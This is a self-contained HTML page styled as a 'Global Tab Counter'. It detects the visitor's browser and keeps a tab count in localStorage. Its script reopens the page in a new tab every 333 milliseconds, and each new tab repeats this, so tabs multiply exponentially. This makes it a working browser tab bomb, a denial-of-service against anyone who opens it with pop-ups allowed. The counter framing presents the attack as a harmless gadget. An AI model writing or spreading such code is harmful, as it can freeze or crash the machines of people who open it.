<!DOCTYPE html>
<html>
<head>
    <title>Global Tab Counter</title>
    <style>
        body {
            background: #0d0d0d;
            color: #00e5ff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            border: 2px solid #00e5ff;
            padding: 30px;
            text-align: center;
            border-radius: 10px;
            box-shadow: 0 0 15px #00e5ff;
        }
        #browser-id { color: #ff0055; font-weight: bold; }
        #count { font-size: 100px; display: block; margin: 10px 0; }
    </style>
</head>
<body>

    <div class="container">
        <h2>DETECTED BROWSER: <span id="browser-id">Detecting...</span></h2>
        <div id="count">0</div>
        <p>TOTAL TABS IN SESSION</p>
    </div>

    <script>
        const countElement = document.getElementById('count');
        const browserElement = document.getElementById('browser-id');

        // --- 1. Detect Browser Engine ---
        function getBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes("Edg/")) return "Microsoft Edge";
            if (ua.includes("OPR/") || ua.includes("Opera")) return "Opera";
            if (ua.includes("Chrome")) return "Google Chrome";
            return "Unknown Browser";
        }
        browserElement.innerText = getBrowser();

        // --- 2. Reliable Counting Logic ---
        function updateTabCount() {
            // Get current value or start at 0
            let total = parseInt(localStorage.getItem('global_tab_count')) || 0;
            total++;
            localStorage.setItem('global_tab_count', total);
            
            // Show the updated number
            countElement.innerText = total;
        }

        // --- 3. Sync across all tabs ---
        window.addEventListener('storage', (event) => {
            if (event.key === 'global_tab_count') {
                countElement.innerText = event.newValue;
            }
        });

        // --- 4. The Spawner ---
        function spawn() {
            window.open(window.location.href, '_blank');
        }

        // Initialize and start the loop
        updateTabCount();
        
        // This will only work if you have already clicked "Always allow popups"
        // for this file in your browser's address bar!
        setInterval(spawn, 333); 
    </script>
</body>
</html>
